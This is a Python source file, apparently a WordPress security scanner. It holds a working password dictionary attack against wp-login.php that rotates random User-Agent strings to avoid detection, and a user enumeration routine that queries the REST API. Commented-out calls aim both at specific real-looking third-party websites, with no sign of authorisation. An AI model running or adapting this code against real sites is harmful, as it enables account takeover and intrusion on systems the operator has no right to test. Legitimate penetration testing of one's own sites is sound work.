from markdownmaker.document import Document
from markdownmaker.markdownmaker import *

import requests
import hashlib
import random
from time import sleep

def dictionaryAttack(doc, url, fileName, userName):

    with HeaderSubLevel(doc):
        doc.add(Header("Testing weak credentials"))


    successful_logins = []
    userAgentLines = []
    passwdList = []

    with open(fileName, 'r') as f:
        passwdList = f.read().splitlines()
        f.close()

    with open('userAgentsList.txt') as f:
        userAgentLines = f.read().splitlines()
        f.close()
    # print(passwdList)
    found = 0
    for passwd in passwdList:

        # passwd_hash = hashlib.sha256(passwd.encode()).hexdigest()
        # sleep(random.randint(10, 120))
        responseCode = requests.post(f'{url}/wp-login.php',
                                     headers={'Cookie':'wordpress_test_cookie=WP Cookie check', 
                                              'User-Agent': random.choice(userAgentLines)}, 
                                     allow_redirects=True, 
                                     data={'log':userName, 
                                           'pwd': passwd, 
                                           'wp-submit': 'Log+In', 
                                           'redirect_to': f'{url}/wp-admin', 
                                           'testcookie':1}
                                     ) 
        # print(responseCode.status_code)
        if 'Log Out' in responseCode.text:
            # atunci a mers 
            found = 1
            doc.add(Paragraph(f'The scanner found the password: {passwd}'))
            break
        
    if found == 0:
        doc.add(Paragraph(f"The scanner could not find any successful credentials for the user {userName} in the given list."))
        
    # return successful_logins


def userEnumerationByAPI(doc, url, numberOfIdsToTry=20):

    with HeaderSubLevel(doc):
        doc.add(Header("Enumerating users via WordPress API"))

    usersFound = []
    userAgentLines = []

    with open('userAgentsList.txt') as f:
        userAgentLines = f.read().splitlines()
        f.close()
    
    # e o posibilitate sa nu ii arate pe toti dintr un oarecare motiv asa ca o sa trebuiasca sa faci bruteforce
    for i in range(0, numberOfIdsToTry + 1):
        jsonResponse = requests.get(f'{url}?rest_route=/wp/v2/users/{i}', headers={'User-Agent': random.choice(userAgentLines)})
        if jsonResponse.status_code == 200:
            name, slug = jsonResponse.json()['name'], jsonResponse.json()['slug']
            doc.add(Paragraph(f'{Bold(name)}: {Italic(slug)}'))
            usersFound.append((name, slug))
        elif jsonResponse.status_code == 401:
            print(f'[!] User maybe found with the id (but can\'t be extracted): {i}')
    
    print(f'[✓] Users found by enumeration: {usersFound}')

# print(dictionaryAttack('https://ecomedbt.ro/', 'numeparola.txt', 'admin'))
# userEnumerationByAPI('https://mentalhealthforromania.org')

def activeScanAll(doc, websiteName, user, passwordList):
    userEnumerationByAPI(doc, websiteName)
    doc.add(HorizontalRule())
    # dictionaryAttack(doc, websiteName, passwordList, user)
    

